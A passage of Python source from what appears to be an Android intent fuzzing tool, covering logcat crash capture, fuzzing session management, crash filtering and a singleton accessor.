                        crash_id=hashlib.md5(line.encode()).hexdigest()[:12],
                        crash_type=CrashType.NATIVE_CRASH,
                        severity=Severity.CRITICAL,
                        component=package,
                        component_type=ComponentType.ACTIVITY,
                        logcat_snippet=line[:500]
                    )

                    await queue.put(crash)

        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.warning(f"Logcat monitoring error: {e}")

    # ========================================================================
    # Session Management
    # ========================================================================

    def get_session(self, session_id: str) -> Optional[IntentFuzzResult]:
        """Get a fuzzing session by ID."""
        return self.sessions.get(session_id)

    def get_all_sessions(self) -> List[IntentFuzzResult]:
        """Get all fuzzing sessions."""
        return list(self.sessions.values())

    async def stop_session(self, session_id: str) -> bool:
        """Stop an active fuzzing session."""
        session = self.sessions.get(session_id)
        if not session:
            return False

        session.status = "stopped"

        # Cancel logcat task
        if session_id in self._logcat_tasks:
            self._logcat_tasks[session_id].cancel()
            del self._logcat_tasks[session_id]

        return True

    def get_crashes(
        self,
        session_id: Optional[str] = None,
        severity: Optional[Severity] = None,
        crash_type: Optional[CrashType] = None
    ) -> List[IntentCrash]:
        """Get crashes, optionally filtered."""
        crashes = []

        sessions = [self.sessions[session_id]] if session_id else self.sessions.values()

        for session in sessions:
            for crash in session.crashes:
                if severity and crash.severity != severity:
                    continue
                if crash_type and crash.crash_type != crash_type:
                    continue
                crashes.append(crash)

        return crashes


# ============================================================================
# Module-level instance
# ============================================================================

_intent_fuzzer: Optional[AndroidIntentFuzzer] = None


def get_intent_fuzzer() -> AndroidIntentFuzzer:
    """Get or create the intent fuzzer singleton."""
    global _intent_fuzzer
    if _intent_fuzzer is None:
        _intent_fuzzer = AndroidIntentFuzzer()
    return _intent_fuzzer
